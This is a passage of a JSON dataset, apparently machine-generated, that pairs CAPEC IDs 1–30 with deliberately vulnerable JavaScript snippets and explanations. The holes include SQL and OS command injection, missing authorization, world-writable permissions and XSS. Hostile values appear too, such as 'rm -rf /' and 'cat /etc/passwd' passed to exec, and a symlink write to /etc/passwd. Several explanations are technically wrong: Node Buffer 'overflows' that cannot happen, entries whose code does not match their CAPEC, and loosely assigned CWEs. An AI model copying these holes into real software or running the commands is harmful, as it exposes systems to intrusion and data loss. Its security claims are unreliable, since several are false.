[
    {
        "capec_id": "1",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// CWE-285: Improper Authorization\napp.get('/admin', (req, res) => {\n  res.render('admin'); // no authorization check\n});\n\n// CWE-276: Incorrect Default Permissions\nconst fs = require('fs');\nfs.chmodSync('/path/to/sensitive/file', '0777'); // world-writable\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nconst criticalResource = {\n  data: 'sensitive information'\n};\n\n// CWE-1220: Insufficient Granularity of Access Control\nconst acl = {\n  'user': ['read'],\n  'admin': ['read', 'write']\n};\n\napp.get('/critical-resource', (req, res) => {\n  if (req.user.role === 'user') {\n    res.json(criticalResource); // insufficient access control\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC 'Insufficient Access Control' by showcasing several CWEs. The express.js application lacks proper authorization checks, allowing unauthorized access to the admin panel. Additionally, it sets incorrect default permissions for a sensitive file, making it world-writable. The code also assigns incorrect permissions to a critical resource and implements insufficient access control, allowing unauthorized users to access sensitive information."
    },
    {
        "capec_id": "2",
        "code_snippet": "const maxAttempts = 3;\nlet attempts = 0;\n\nfunction authenticate(username, password) {\n  if (attempts >= maxAttempts) {\n    console.log('Account locked out.');\n    return false;\n  }\n\n  if (username === 'admin' && password === 'password123') {\n    attempts = 0;\n    return true;\n  } else {\n    attempts++;\n    console.log('Invalid credentials. Attempts remaining: ' + (maxAttempts - attempts));\n    return false;\n  }\n}\n\n// Attacker's script\nfor (let i = 0; i < maxAttempts; i++) {\n  authenticate('admin', 'wrongpassword');\n}\n",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be exploited by an attacker to lock out a legitimate user. The mechanism has an overly restrictive account lockout policy (CWE-645) that locks the account after a fixed number of incorrect login attempts. The code also lacks sufficient measures to prevent multiple failed authentication attempts within a short time frame (CWE-307), making it susceptible to brute-force attacks. Additionally, the password requirements are weak (CWE-521), and the authentication mechanism can be bypassed due to a primary weakness (CWE-305). The attacker's script demonstrates how to exploit this vulnerability by making multiple incorrect login attempts, ultimately locking out the legitimate user."
    },
    {
        "capec_id": "3",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userInput = req.query.input;\n  const filteredInput = userInput.replace(/^\\s+/, ''); // Stripping leading whitespace characters\n  const data = {\n    'userInput': filteredInput\n  };\n  res.json(data);\n});\n\n// Vulnerable API endpoint\napp.get('/api/protected', (req, res) => {\n  const userInput = req.query.input;\n  if (userInput === 'admin') {\n    res.json({ 'message': 'Access granted' });\n  } else {\n    res.status(403).json({ 'message': 'Access denied' });\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC 'Stripping Leading Characters' vulnerability. The API endpoint '/api/data' strips leading whitespace characters from the user input, but the '/api/protected' endpoint does not. An attacker can exploit this by sending a request to '/api/protected' with a leading whitespace character, e.g., '%20admin', which would bypass the input validation and grant access."
    },
    {
        "capec_id": "4",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const ip = req.ip;\n  if (ip === '127.0.0.1' || ip === '::1' || ip === 'localhost') {\n    res.send('Welcome, admin!');\n  } else {\n    res.send('Access denied.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js application that relies on IP address for authentication (CWE-291) and does not properly handle alternate encoding of IP addresses (CWE-173). An attacker can bypass the access control by using an alternate encoding of the IP address, such as '0177.0000.0000.0001' or '2130706433' instead of '127.0.0.1'. The code also lacks proper validation of the IP address, making it vulnerable to other attacks such as reverse DNS resolution (CWE-350) and improper restriction of communication channel (CWE-923)."
    },
    {
        "capec_id": "5",
        "code_snippet": "const net = require('net');\nconst telcoServer = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    if (data.toString() === 'supervisor_signal') {\n      // Grant administrative access without proper authorization\n      socket.write('admin_access_granted');\n    } else {\n      socket.write('access_denied');\n    }\n  });\n});\ntelcoServer.listen(8080, () => {\n  console.log('Telco server listening on port 8080');\n});\n\nconst attacker = net.connect({ port: 8080 }, () => {\n  console.log('Connected to telco server');\n  // Send a fake supervisor signal to impersonate an administrative request\n  attacker.write('supervisor_signal');\n});",
        "description": "This code snippet demonstrates a vulnerable Telco system that can be exploited using Blue boxing. The server grants administrative access when it receives a specific signal, without properly verifying the source or authenticity of the request. An attacker can send a fake signal to impersonate an administrative request, bypassing authorization and gaining unauthorized access."
    },
    {
        "capec_id": "6",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getUserDetails(username) {\n  const query = `cat /etc/passwd | grep ${username}`;\n  exec(query, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\ngetUserDetails('admin');",
        "description": "This JavaScript code snippet demonstrates OS Command Injection (CWE-78) and Improper Neutralization of Special Elements in Output Used by a Downstream Component (CWE-74). The `getUserDetails` function takes a username as input and constructs an OS command using the input. The command is then executed using the `child_process` module. An attacker can inject malicious commands by providing a specially crafted username, such as `admin; rm -rf /`. The code does not properly neutralize special elements in the input, allowing the attacker to modify the intended OS command."
    },
    {
        "capec_id": "7",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users/:id', (req, res) => {\n  const id = req.params.id;\n  const query = `SELECT * FROM users WHERE id = ${id}`;\n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n      res.status(500).send('Error occurred');\n    } else {\n      res.send(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to Blind SQL Injection. The code uses user input from the URL parameter 'id' to construct a SQL query without proper input validation or sanitization, making it vulnerable to SQL Injection attacks (CWE-89). The error handling mechanism only logs the error and returns a generic error message, which does not provide any sensitive information (CWE-209). However, the lack of proper input validation and sanitization allows an attacker to inject malicious SQL code, potentially leading to unauthorized data access or modification. The code also lacks proper neutralization of special elements in the output (CWE-74) and incorrect comparison (CWE-697), making it more vulnerable to attacks. Additionally, the code does not ensure that the input has the required properties to process the data safely and correctly (CWE-20), and does not ensure that structured messages or data are well-formed (CWE-707)."
    },
    {
        "capec_id": "8",
        "code_snippet": "function vulnerableFunction(buffer) {\n  var outputBuffer = new Buffer(1024);\n  outputBuffer.write(buffer, 0, buffer.length);\n  return outputBuffer.toString();\n}\n\n// Example usage:\nvar userInput = \"A\".repeat(2048);\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The `vulnerableFunction` takes a `buffer` as input and copies it to an `outputBuffer` without checking the size of the input. This can lead to a buffer overflow, allowing an attacker to inject malicious code. The example usage shows how an attacker can exploit this vulnerability by providing a large input string."
    },
    {
        "capec_id": "9",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction escalatePrivilege(cmd) {\n  const buffer = Buffer.alloc(10);\n  buffer.write(cmd, 0);\n  const overflowBuffer = Buffer.alloc(5);\n  overflowBuffer.write(buffer.toString(), 0);\n  const maliciousCmd = `sudo ${overflowBuffer.toString()}`;\n  exec(maliciousCmd, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\nescalatePrivilege('whoami');",
        "description": "This JavaScript code snippet demonstrates a command-line utility vulnerability that can be exploited to escalate privilege to root. It uses a buffer overflow (CWE-120) to inject a malicious command into the system, leveraging incorrect access of indexable resources (CWE-118) and improper restriction of operations within the bounds of a memory buffer (CWE-119). The code also lacks input validation (CWE-20) and is susceptible to integer overflow to buffer overflow (CWE-680). Additionally, the code may be vulnerable to compiler optimization removal or modification of security-critical code (CWE-733) and incorrect comparison (CWE-697). The malicious command is executed using the 'child_process' module, which can lead to privilege escalation."
    },
    {
        "capec_id": "10",
        "code_snippet": "const exec = require('child_process').exec;\nconst userInput = process.env.USER_INPUT;\nconst bufferSize = 10;\nconst buffer = new Buffer(bufferSize);\nbuffer.write(userInput, 0, bufferSize);\nconst command = `echo ${buffer.toString()}`;\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This code snippet demonstrates a buffer overflow vulnerability through manipulation of environment variables. The 'USER_INPUT' environment variable is not validated, allowing an attacker to overflow the 'buffer' variable. The 'exec' function is then used to execute a command with the overflowed buffer, potentially leading to code execution. This code combines CWE-120 (Buffer Copy without Checking Size of Input), CWE-20 (Improper Input Validation), and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "11",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/:file', (req, res) => {\n  const file = req.params.file;\n  const filePath = `./uploads/${file}`;\n  res.download(filePath);\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an attacker to exploit the server by misclassifying files based on their extensions. The code uses the Express.js framework to create an endpoint that downloads files from the 'uploads' directory. The file name is taken from the URL parameter, and the server trusts the file extension to determine the appropriate behavior. An attacker can exploit this by uploading a file with a malicious extension, causing the server to execute it unexpectedly."
    },
    {
        "capec_id": "12",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/updateRole', (req, res) => {\n  const userId = req.body.userId;\n  const newRole = req.body.newRole;\n  const userRoles = {\n    'user1': 'admin',\n    'user2': 'moderator',\n    'user3': 'user'\n  };\n\n  if (userId in userRoles) {\n    userRoles[userId] = newRole;\n    res.send(`Role updated for user ${userId} to ${newRole}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript server that allows an attacker to impersonate another user and gain unauthorized access to privileged information. The server uses a public information channel (HTTP request) to update a user's role, but it does not perform any authentication or validation of the user's identity. An attacker can send a malicious request with a spoofed user ID and new role, allowing them to gain unauthorized access to the system. This code embodies CWE-201 (Insertion of Sensitive Information Into Sent Data), CWE-306 (Missing Authentication for Critical Function), CWE-1292 (Incorrect Conversion of Security Identifiers), CWE-1290 (Incorrect Decoding of Security Identifiers), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel)."
    },
    {
        "capec_id": "13",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userId = req.query.userId;\n  const userData = getUserData(userId);\n  res.json(userData);\n});\n\nfunction getUserData(userId) {\n  const dbQuery = `SELECT * FROM users WHERE id = ${userId}`;\n  return db.query(dbQuery);\n}\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates the CAPEC of modifying environment variables to deviate from expected operation. The code uses Express.js to create a RESTful API that retrieves user data based on a provided user ID. However, it is vulnerable to several CWEs. CWE-20: Improper Input Validation - The code does not validate the user ID input, allowing an attacker to inject malicious data. CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component - The code uses the user ID input to construct a database query without proper sanitization, making it vulnerable to SQL injection. CWE-285: Improper Authorization - The code does not perform any authorization checks, allowing an attacker to access sensitive user data. CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - The code exposes sensitive user data to an unauthorized actor. CWE-15: External Control of System or Configuration Setting - The code allows an attacker to control the database query, which can be used to modify system settings or configuration elements. CWE-302: Authentication Bypass by Assumed-Immutable Data - The code assumes that the user ID input is immutable, but an attacker can control or modify it. CWE-353: Missing Support for Integrity Check - The code does not include a mechanism for verifying the integrity of the data during transmission. CWE-73: External Control of File Name or Path - The code does not restrict file access, allowing an attacker to control file names or paths."
    },
    {
        "capec_id": "14",
        "code_snippet": "function processUserInput(input) {\n  var buffer = new Buffer(1024);\n  var hostileServiceContent = getHostileServiceContent();\n  buffer.write(hostileServiceContent, 0, hostileServiceContent.length);\n  var userInput = input;\n  buffer.write(userInput, 0, userInput.length);\n  var output = '';\n  for (var i = 0; i < buffer.length; i++) {\n    output += buffer[i];\n  }\n  return output;\n}\n\nfunction getHostileServiceContent() {\n  return '<script>alert(\"XSS\")</script>'; // malicious content\n}\n",
        "description": "This code snippet demonstrates a buffer overflow vulnerability in a JavaScript function that processes user input. The function uses a fixed-size buffer to store the input, but it does not check the size of the input before writing it to the buffer. This allows an attacker to provide a large input that exceeds the buffer size, causing a buffer overflow. The function also uses a hostile service to deliver malicious content, which is injected into the buffer. The CWEs embodied in this code snippet include CWE-120 (Buffer Copy without Checking Size of Input), CWE-20 (Improper Input Validation), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), and CWE-680 (Integer Overflow to Buffer Overflow)."
    },
    {
        "capec_id": "15",
        "code_snippet": "const userInput = \"cat /etc/passwd\";\nconst delimiter = \"|\";\nconst command = `ls -l ${delimiter} ${userInput}`;\nconst child = require('child_process').exec(command);\nchild.stdout.on('data', (data) => {\n  console.log(`stdout: ${data}`);\n});",
        "description": "This JavaScript code snippet demonstrates command injection vulnerability. It takes user input and concatenates it with a legitimate command using a delimiter. The user input is not properly sanitized, allowing an attacker to inject malicious commands, such as reading sensitive files. This code is vulnerable to CWE-77, CWE-78, CWE-140, CWE-146, and CWE-184."
    },
    {
        "capec_id": "16",
        "code_snippet": "const dictionary = ['password123', 'iloveyou', 'dragonball'];\nconst users = [{username: 'john', password: 'dragonball'}, {username: 'jane', password: 'iloveyou'}];\n\nfunction authenticate(username, password) {\n  for (let i = 0; i < users.length; i++) {\n    if (users[i].username === username && users[i].password === password) {\n      return true;\n    }\n  }\n  return false;\n}\n\nfor (let i = 0; i < dictionary.length; i++) {\n  for (let j = 0; j < users.length; j++) {\n    if (authenticate(users[j].username, dictionary[i])) {\n      console.log(`Access granted for ${users[j].username} with password ${dictionary[i]}`);\n    }\n  }\n}",
        "description": "This code snippet demonstrates a dictionary attack, where an attacker tries each word in a dictionary as passwords to gain access to the system via some user's account. The code has weak password requirements (CWE-521), does not implement password aging (CWE-262), and relies on single-factor authentication (CWE-308). It also lacks restrictions on excessive authentication attempts (CWE-307) and uses a password system as the primary means of authentication (CWE-309)."
    },
    {
        "capec_id": "17",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst uploadDir = './uploads';\nconst executableDir = './executables';\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nfs.chmodSync(uploadDir, '0777');\nfs.chmodSync(executableDir, '0777');\n\n// CWE-285: Improper Authorization\nfunction uploadFile(req, res) {\n  const file = req.files.file;\n  const filePath = path.join(uploadDir, file.name);\n  fs.writeFileSync(filePath, file.data);\n  res.send(`File uploaded successfully: ${filePath}`);\n}\n\n// CWE-272: Least Privilege Violation\nfunction executeFile(req, res) {\n  const fileName = req.params.fileName;\n  const filePath = path.join(executableDir, fileName);\n  const childProcess = require('child_process');\n  childProcess.execFileSync(filePath, [], { stdio: 'inherit' });\n  res.send(`File executed successfully: ${filePath}`);\n}\n\n// CWE-59: Improper Link Resolution Before File Access ('Link Following')\nfunction getFile(req, res) {\n  const fileName = req.params.fileName;\n  const filePath = path.join(uploadDir, fileName);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.status(404).send('File not found');\n    } else {\n      res.send(data);\n    }\n  });\n}\n\n// CWE-282: Improper Ownership Management\nfunction changeFileOwner(req, res) {\n  const fileName = req.params.fileName;\n  const filePath = path.join(uploadDir, fileName);\n  fs.chownSync(filePath, req.user.id, (err) => {\n    if (err) {\n      res.status(500).send('Error changing file owner');\n    } else {\n      res.send(`File owner changed successfully: ${filePath}`);\n    }\n  });\n}\n\n// CWE-270: Privilege Context Switching Error\nfunction switchPrivileges(req, res) {\n  const childProcess = require('child_process');\n  childProcess.setuid(0);\n  res.send('Privileges switched successfully');\n}\n\n// CWE-693: Protection Mechanism Failure\nfunction disableSecurity(req, res) {\n  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n  res.send('Security disabled successfully');\n}",
        "description": "This code snippet demonstrates a vulnerable Node.js server that allows an adversary to upload and execute arbitrary files, violating multiple security principles. The server has incorrect permission assignments, improper authorization, and least privilege violations, allowing an attacker to access and execute files with elevated privileges. The code also demonstrates improper link resolution, improper ownership management, privilege context switching errors, and protection mechanism failures, making it vulnerable to various attacks."
    },
    {
        "capec_id": "18",
        "code_snippet": "<img src='x' onerror='alert(\"XSS\")'>",
        "description": "This code snippet demonstrates a stored XSS vulnerability, where an attacker injects malicious script into an image tag's onerror attribute. The script will execute when the image fails to load, allowing the attacker to steal user data or take control of the user's session. This vulnerability is a result of improper neutralization of script-related HTML tags in a web page (CWE-80), improper neutralization of script in attributes of IMG tags in a web page (CWE-82), and incomplete denylist to cross-site scripting (CWE-692)."
    },
    {
        "capec_id": "19",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.userInput;\n  const script = `<script>${userInput}</script>`;\n  res.send(script);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that allows an adversary to execute their own script by embedding it within other scripts that the target software is likely to execute. The application uses the Express.js framework and listens on port 3000. When a GET request is made to the root URL, the application takes user input from the query string and injects it into a script tag, which is then sent back to the user. This allows an attacker to inject malicious scripts, such as cross-site scripting (CWE-79) or embedded malicious code (CWE-506), and execute them in the context of the target software. The application also lacks proper access control (CWE-284) and does not restrict access to the resource. Additionally, the inclusion of web functionality from an untrusted source (CWE-830) and unintended reentrant invocation of non-reentrant code (CWE-1265) can also be exploited in this scenario."
    },
    {
        "capec_id": "20",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-326: Inadequate Encryption Strength\n// CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nconst cipher = crypto.createCipher('des', 'my_secret_key');\n\n// CWE-693: Protection Mechanism Failure\n// CWE-1204: Generation of Weak Initialization Vector (IV)\nconst iv = '12345678';\n\nconst plaintext = 'Top Secret Information';\nconst encrypted = cipher.update(plaintext, 'utf8', 'hex');\n\n// CWE-321: Use of Hard-coded Cryptographic Key\nconst hardcodedKey = 'my_secret_key';\n\n// Brute Force Attack\nfor (let i = 0; i < 1000000; i++) {\n  const attemptKey = i.toString().padStart(8, '0');\n  const decipher = crypto.createDecipher('des', attemptKey);\n  const decrypted = decipher.update(encrypted, 'hex', 'utf8');\n  if (decrypted === plaintext) {\n    console.log(`Key found: ${attemptKey}`);\n    break;\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable encryption scheme that uses a weak encryption algorithm (DES), a hard-coded key, and a weak initialization vector. An attacker can perform a brute-force attack to guess the key and decrypt the sensitive information."
    },
    {
        "capec_id": "21",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst cookieParser = require('cookie-parser');\napp.use(cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    const sessionId = generateSessionId(); // CWE-6: Insufficient Session-ID Length\n    res.cookie('sessionId', sessionId, { expires: new Date(Date.now() + 900000), httpOnly: true });\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId) {\n    // CWE-290: Authentication Bypass by Spoofing\n    // CWE-346: Origin Validation Error\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    // CWE-642: External Control of Critical State Data\n    const userData = getUserDataFromSessionId(sessionId);\n    res.send(`Welcome, ${userData.username}!`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that is susceptible to session fixation attacks (CWE-384). The server generates a session ID and stores it in a cookie without properly validating the user's identity. An attacker can steal the session ID and use it to gain unauthorized access to the protected resource. The code also lacks proper origin validation (CWE-346) and relies on client-side enforcement of server-side security (CWE-602), making it vulnerable to spoofing attacks. Additionally, the session ID is stored in a persistent cookie containing sensitive information (CWE-539), and the server does not maintain control over the resource throughout its lifetime (CWE-664)."
    },
    {
        "capec_id": "22",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (username === 'admin' && password === 'password') {\n    res.cookie('auth', 'true');\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.cookies.auth === 'true') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be exploited by an attacker to bypass authentication and access sensitive information. The server trusts the client's input without proper validation, allowing an attacker to spoof the authentication cookie and gain unauthorized access to the protected resource."
    },
    {
        "capec_id": "23",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst multer = require('multer');\nconst upload = multer({ dest: './uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const file = req.file;\n  const filePath = file.path;\n  const fileExtension = file.originalname.split('.').pop();\n  if (fileExtension === 'pdf' || fileExtension === 'exe') {\n    // No validation or sanitization of the uploaded file\n    res.send(`File uploaded successfully: ${filePath}`);\n  } else {\n    res.status(400).send('Invalid file type');\n  }\n});\n\napp.get('/download/:filename', (req, res) => {\n  const filename = req.params.filename;\n  const filePath = `./uploads/${filename}`;\n  res.download(filePath);\n});",
        "description": "This code snippet demonstrates a vulnerable file upload functionality in a Node.js Express application. It allows users to upload files of any type, including executable files, without proper validation or sanitization. The uploaded files are stored in a publicly accessible directory, and the application relies solely on the file extension to determine the file type. An attacker can exploit this vulnerability by uploading a malicious file, such as a PDF or executable file, which can be executed by the server or downloaded by other users, leading to potential security risks."
    },
    {
        "capec_id": "24",
        "code_snippet": "function filterInput(input) {\n  var buffer = new Buffer(1024);\n  buffer.write(input, 0, input.length);\n  return buffer.toString();\n}\n\nvar userInput = \"\";\nfor (var i = 0; i < 100000; i++) {\n  userInput += \"A\";\n}\n\nfilterInput(userInput);",
        "description": "This code snippet demonstrates a vulnerable filter function that can be overwhelmed by an oversized transaction. The function writes user input to a buffer without checking its size, leading to a buffer overflow (CWE-120). The input string is intentionally oversized to cause the buffer to overflow. This code also lacks input validation (CWE-20), allowing an attacker to inject malicious data. The use of a fixed-size buffer and lack of bounds checking can lead to a range error (CWE-118). Additionally, the code is vulnerable to integer overflow to buffer overflow (CWE-680) if the input size is used in a calculation to determine the buffer size."
    },
    {
        "capec_id": "25",
        "code_snippet": "let lock1 = false;\nlet lock2 = false;\n\nfunction thread1() {\n    while (true) {\n        if (!lock1) {\n            lock1 = true;\n            console.log('Thread 1 acquired lock 1');\n            while (!lock2) {\n                // wait for lock 2 to be released\n            }\n            console.log('Thread 1 acquired lock 2');\n            lock2 = true;\n            // critical section\n            console.log('Thread 1 in critical section');\n            lock1 = false;\n            lock2 = false;\n        }\n    }\n}\n\nfunction thread2() {\n    while (true) {\n        if (!lock2) {\n            lock2 = true;\n            console.log('Thread 2 acquired lock 2');\n            while (!lock1) {\n                // wait for lock 1 to be released\n            }\n            console.log('Thread 2 acquired lock 1');\n            lock1 = true;\n            // critical section\n            console.log('Thread 2 in critical section');\n            lock2 = false;\n            lock1 = false;\n        }\n    }\n}\n\nthread1();\nthread2();",
        "description": "This code snippet demonstrates a deadlock condition in JavaScript. Two threads, thread1 and thread2, are competing for two locks, lock1 and lock2. Each thread tries to acquire both locks, but in a different order, causing a deadlock. The threads will wait indefinitely for each other to release the locks, resulting in a denial of service."
    },
    {
        "capec_id": "26",
        "code_snippet": "const fs = require('fs');\nlet fileContent = '';\nlet fileHandle = null;\n\nfunction readFileAsync() {\n  fs.open('file.txt', 'r', (err, fd) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    fileHandle = fd;\n    fs.read(fd, (err, bytesRead, buffer) => {\n      if (err) {\n        console.error(err);\n        return;\n      }\n      fileContent += buffer.toString();\n      fs.close(fd, () => {\n        console.log('File content:', fileContent);\n      });\n    });\n  });\n}\n\nfunction replaceFileAsync() {\n  fs.writeFile('file.txt', 'Malicious content', (err) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    console.log('File replaced');\n  });\n}\n\nreadFileAsync();\nreplaceFileAsync();",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability (CAPEC-36) by concurrently reading and replacing a file. The `readFileAsync` function opens a file, reads its content, and closes the file handle. The `replaceFileAsync` function replaces the original file with malicious content. If the `replaceFileAsync` function is executed before the `readFileAsync` function completes, the system may read the malicious file instead of the original one, leading to unintended behavior. This code snippet relates to CWE-363 (Race Condition Enabling Link Following), CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization), and CWE-665 (Improper Initialization)."
    },
    {
        "capec_id": "27",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction createTempFile() {\n  const tempDir = '/tmp';\n  const targetFile = '/etc/passwd';\n  const symlinkPath = path.join(tempDir, 'symlink');\n\n  // CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n  if (!fs.existsSync(symlinkPath)) {\n    fs.symlink(targetFile, symlinkPath, (err) => {\n      if (err) {\n        console.error(err);\n      } else {\n        // CWE-61: UNIX Symbolic Link (Symlink) Following\n        fs.writeFile(symlinkPath, 'malicious content', (err) => {\n          if (err) {\n            console.error(err);\n          } else {\n            console.log('Malicious content written to sensitive file');\n          }\n        });\n      }\n    });\n  }\n}\n\ncreateTempFile();",
        "description": "This code snippet demonstrates a TOCTOU race condition vulnerability (CWE-367) that can be exploited using a symbolic link (CWE-61) to write malicious content to a sensitive file. The createTempFile function creates a symbolic link to the target file (/etc/passwd) in a temporary directory. If the symbolic link is successfully created, the function writes malicious content to the symbolic link, which actually writes to the target file due to the race condition."
    },
    {
        "capec_id": "28",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const userInput = req.query.searchTerm;\n  const query = `SELECT * FROM products WHERE name LIKE '%${userInput}%';`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(`Error: ${err}`);\n    } else {\n      res.send(results);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to fuzzing attacks. The code uses user input to construct a SQL query without proper validation or sanitization, making it vulnerable to SQL injection (CWE-74). The code also lacks input validation (CWE-20), allowing an attacker to inject malicious code (CWE-506). The error handling mechanism discloses sensitive information (CWE-209) and the list of disallowed inputs is incomplete (CWE-184), making it easier for an attacker to exploit the system."
    },
    {
        "capec_id": "29",
        "code_snippet": "const fs = require('fs');\n\nfunction getFileContent(filePath) {\n  if (fs.existsSync(filePath)) {\n    // Time-of-check Time-of-use (TOCTOU) Race Condition (CWE-367)\n    // The file existence is checked, but the file content is read later\n    // An attacker can replace the file between the check and the read\n    const fileContent = fs.readFileSync(filePath, 'utf8');\n    return fileContent;\n  } else {\n    return null;\n  }\n}\n\n// Concurrent Execution using Shared Resource with Improper Synchronization (CWE-362)\n// Multiple threads can call getFileContent concurrently, leading to a race condition\nconst thread1 = () => {\n  const content = getFileContent('file.txt');\n  console.log(content);\n};\n\nconst thread2 = () => {\n  fs.writeFileSync('file.txt', 'Malicious content');\n};\n\nthread1();\nthread2();",
        "description": "This JavaScript code snippet demonstrates a Time-of-check Time-of-use (TOCTOU) Race Condition (CWE-367) and Concurrent Execution using Shared Resource with Improper Synchronization (CWE-362). The getFileContent function checks if a file exists, and then reads its content. However, an attacker can replace the file between the check and the read, leading to unexpected behavior. Additionally, the code allows multiple threads to call getFileContent concurrently, which can cause a race condition when accessing the shared file resource."
    },
    {
        "capec_id": "30",
        "code_snippet": "const { fork } = require('child_process');\nconst fs = require('fs');\n\n// CWE-114: Process Control - Executing commands from an untrusted source\nconst untrustedInput = 'rm -rf /';\nconst child = fork('child.js');\nchild.send(untrustedInput);\n\n// CWE-270: Privilege Context Switching Error\nchild.on('message', (msg) => {\n  if (msg === 'inject') {\n    // CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n    const sharedResource = { value: 0 };\n    const thread1 = fork('thread1.js');\n    const thread2 = fork('thread2.js');\n    thread1.send(sharedResource);\n    thread2.send(sharedResource);\n    thread1.on('message', (msg) => {\n      if (msg === 'done') {\n        console.log('Thread 1 finished');\n      }\n    });\n    thread2.on('message', (msg) => {\n      if (msg === 'done') {\n        console.log('Thread 2 finished');\n      }\n    });\n  }\n});\n\n// CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nconst osCommand = `echo ${untrustedInput} >> malicious_file.txt`;\nfs.writeFile('malicious_file.txt', '', () => {\n  require('child_process').exec(osCommand, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC of hijacking a privileged thread of execution by injecting malicious code into a running process. It uses CWE-114 to execute commands from an untrusted source, CWE-270 to switch privileges without proper context management, CWE-362 to exploit a race condition in concurrent execution, and CWE-78 to inject malicious OS commands. CWE-1421 is not directly applicable in this JavaScript example, as it relates to microarchitectural structures in CPU caches."
    },
    {
        "capec_id": "31",
